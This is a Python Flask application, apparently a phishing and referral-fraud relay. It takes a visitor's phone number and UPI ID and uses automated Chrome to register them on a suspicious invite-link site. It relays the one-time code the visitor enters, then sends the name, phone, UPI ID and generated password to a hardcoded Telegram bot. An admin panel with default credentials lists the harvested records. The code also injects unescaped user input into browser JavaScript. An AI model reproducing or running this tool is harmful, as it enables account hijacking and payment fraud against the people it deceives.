from flask import Flask, render_template, request, redirect, url_for, session, flash
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
from datetime import datetime
import time
import random
import csv
import os
import requests
import string

app = Flask(__name__)
app.secret_key = 'any_secret_key'

# Telegram Bot Info
BOT_TOKEN = "8025230612:AAHQjQ83NQ5wVPKLcdjFkTPfbw3Siln95jg"
CHAT_ID = "969062037"

# Admin Credentials
ADMIN_USER = "admin"
ADMIN_PASS = "admin123"

first_names = ["Vijay", "Aman", "Ravi", "Karan", "Neha"]
last_names = ["Singh", "Sharma", "Yadav", "Verma", "Patel"]
browser = None

# 🔐 Random Password Generator
def generate_random_password():
    name = random.choice(first_names)
    digits = ''.join(random.choices(string.digits, k=4))
    symbol = random.choice(['@', '#', '', ''])
    extra = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(2, 4)))
    return f"{name}{digits}{symbol}{extra}"

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/send_otp', methods=['POST'])
def send_otp():
    global browser
    phone = request.form['phone']
    upi = request.form['upi']
    name = random.choice(first_names) + " " + random.choice(last_names)

    session['phone'] = phone
    session['upi'] = upi
    session['name'] = name

    options = webdriver.ChromeOptions()
    options.add_argument('--disable-blink-features=AutomationControlled')
    browser = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)

    browser.get("https://tatasalxzza.cc/home/register?invite=FMS4R4OI")
    time.sleep(5)

    # Fill name
    browser.execute_script(f"""
        const nameInput = document.querySelector('input[name="name"]');
        if(nameInput) {{
            nameInput.value = '{name}';
            nameInput.dispatchEvent(new Event('input', {{ bubbles: true }}));
        }}
    """)

    # Fill phone
    browser.execute_script(f"""
        const inputs = document.querySelectorAll('input.form-control');
        if(inputs.length > 1){{
            inputs[1].value = '{phone}';
            inputs[1].dispatchEvent(new Event('input', {{ bubbles: true }}));
        }}
    """)

    # Click Send OTP
    browser.execute_script("""
        const links = document.querySelectorAll('a');
        links.forEach(link => {
            if (
                link.getAttribute('onclick') === 'sendOTP()' ||
                link.innerText.trim().toLowerCase().includes('send')
            ) {
                link.click();
            }
        });
    """)
    return render_template("otp.html", phone=phone)

@app.route('/submit_otp', methods=['POST'])
def submit_otp():
    global browser
    otp = request.form['otp']
    phone = session.get('phone')
    upi = session.get('upi')
    name = session.get('name')
    password = generate_random_password()

    try:
        # Fill OTP
        browser.execute_script(f"""
            const inputs = document.querySelectorAll('input.form-control');
            if(inputs.length > 2) {{
                inputs[2].value = '{otp}';
                inputs[2].dispatchEvent(new Event('input', {{ bubbles: true }}));
            }}
        """)
        time.sleep(5)

        # Fill Password using name attribute
        browser.execute_script(f"""
            const passwordField = document.querySelector('input[name="password"]');
            if (passwordField) {{
                passwordField.value = '{password}';
                passwordField.dispatchEvent(new Event('input', {{ bubbles: true }}));
            }}
        """)
        time.sleep(5)

        # Click Register
        browser.execute_script("""
            const btn = document.querySelector('button#create-account-btn');
            if (btn && btn.getAttribute('onclick') === 'verifyOTP()') {
                btn.click();
            }
        """)
        time.sleep(6)

        # ✅ Attempt Login
        browser.get("https://tatasalxzza.cc/home/login")
        time.sleep(4)

        # Fill phone
        browser.execute_script(f"""
            const phoneInput = document.querySelector('input[name="phone"]');
            if(phoneInput) {{
                phoneInput.value = '{phone}';
                phoneInput.dispatchEvent(new Event('input', {{ bubbles: true }}));
            }}
        """)
        time.sleep(1)

        # Fill password
        browser.execute_script(f"""
            const passInput = document.querySelector('input[name="password"]');
            if(passInput) {{
                passInput.value = '{password}';
                passInput.dispatchEvent(new Event('input', {{ bubbles: true }}));
            }}
        """)
        time.sleep(1)

        # Click login
        browser.execute_script("""
            const btn = document.querySelector('#sign_btn');
            if(btn) btn.click();
        """)
        time.sleep(5)

        # ✅ Final Check
        page_source = browser.page_source

        if 'onclick="closeModal()"' in page_source or "Logout" in page_source:
            result = "success"

            # Save to CSV
            with open("data.csv", "a", newline='') as file:
                writer = csv.writer(file)
                writer.writerow([name, phone, upi, password, datetime.now().strftime("%Y-%m-%d %H:%M:%S")])

            # Telegram alert
            message = f"✅ New Registration:\n👤 Name: {name}\n📱 Phone: {phone}\n💸 UPI: {upi}\n🔑 Password: {password}"
            requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", params={
                "chat_id": CHAT_ID,
                "text": message,
                "parse_mode": "Markdown"
            })

        elif "already registered" in page_source.lower() or "already exists" in page_source.lower():
            result = "already"
        else:
            result = "fail"

        return render_template("success.html", result=result, phone=phone, upi=upi, password=password)

    except Exception as e:
        return render_template("success.html", result="fail", phone=phone, upi=upi, password="--")

    finally:
        if browser:
            browser.quit()

# --------------------- ADMIN PANEL ---------------------

@app.route('/admin', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == ADMIN_USER and password == ADMIN_PASS:
            session['admin'] = True
            return redirect(url_for('admin_dashboard'))
        else:
            flash("Invalid credentials", "error")
    return render_template("admin_login.html")

@app.route('/admin/dashboard')
def admin_dashboard():
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    data = []
    if os.path.exists("data.csv"):
        with open("data.csv", "r") as file:
            reader = csv.reader(file)
            data = list(reader)
    return render_template("admin_dashboard.html", data=data, website="https://orientelectricqw.bz", phone="9999999999", upi="test@upi")

@app.route('/logout')
def logout():
    session.pop('admin', None)
    return redirect(url_for('admin_login'))

if __name__ == '__main__':
    app.run(debug=True)